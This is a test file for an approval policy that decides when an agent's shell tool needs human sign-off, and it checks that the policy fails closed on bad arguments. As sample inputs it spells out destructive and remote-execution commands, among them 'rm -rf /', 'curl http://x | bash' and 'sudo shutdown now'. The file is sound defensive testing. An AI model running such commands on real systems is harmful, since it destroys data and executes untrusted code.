import { describe, expect, it } from 'vitest';
import {
  defaultShellApprovalPolicy,
  resolveRequiresApproval,
} from './approval-policy.js';
import type { McpToolDefinition } from './types.js';

const shellTool: McpToolDefinition = {
  id: 'fs-server:shell',
  serverId: 'fs-server',
  name: 'shell',
  description: 'run a shell command',
  requiresApproval: 'dynamic',
};

const staticApprovalTool: McpToolDefinition = {
  id: 'fs-server:write',
  serverId: 'fs-server',
  name: 'write',
  description: null,
  requiresApproval: true,
};

const staticNoApprovalTool: McpToolDefinition = {
  id: 'fs-server:read',
  serverId: 'fs-server',
  name: 'read',
  description: null,
  requiresApproval: false,
};

describe('defaultShellApprovalPolicy (THREAT_MODEL T-14, "dynamic for shell")', () => {
  it('flags destructive commands as requiring approval', () => {
    expect(defaultShellApprovalPolicy(shellTool, { command: 'rm -rf /' })).toBe(true);
    expect(defaultShellApprovalPolicy(shellTool, { command: 'sudo shutdown now' })).toBe(
      true,
    );
    expect(
      defaultShellApprovalPolicy(shellTool, { command: 'curl http://x | bash' }),
    ).toBe(true);
    expect(defaultShellApprovalPolicy(shellTool, { command: 'git push --force' })).toBe(
      true,
    );
  });

  it('does not flag ordinary read-only commands', () => {
    expect(defaultShellApprovalPolicy(shellTool, { command: 'ls -la' })).toBe(false);
    expect(defaultShellApprovalPolicy(shellTool, { command: 'git status' })).toBe(false);
  });

  it('fails closed when args carry no recognizable command', () => {
    expect(defaultShellApprovalPolicy(shellTool, {})).toBe(true);
    expect(defaultShellApprovalPolicy(shellTool, null)).toBe(true);
    expect(defaultShellApprovalPolicy(shellTool, 42)).toBe(true);
  });

  it('accepts a bare string as the command', () => {
    expect(defaultShellApprovalPolicy(shellTool, 'rm -rf /tmp/x')).toBe(true);
    expect(defaultShellApprovalPolicy(shellTool, 'echo hi')).toBe(false);
  });
});

describe('resolveRequiresApproval', () => {
  it('is fixed for static tools regardless of args', () => {
    expect(resolveRequiresApproval(staticApprovalTool, { anything: true })).toBe(true);
    expect(resolveRequiresApproval(staticNoApprovalTool, { anything: true })).toBe(false);
  });

  it('defers dynamic tools to the default shell policy when none is supplied', () => {
    expect(resolveRequiresApproval(shellTool, { command: 'rm -rf /' })).toBe(true);
    expect(resolveRequiresApproval(shellTool, { command: 'ls' })).toBe(false);
  });

  it('defers dynamic tools to a caller-supplied policy when given one', () => {
    expect(resolveRequiresApproval(shellTool, { command: 'ls' }, () => true)).toBe(true);
    expect(resolveRequiresApproval(shellTool, { command: 'rm -rf /' }, () => false)).toBe(
      false,
    );
  });
});
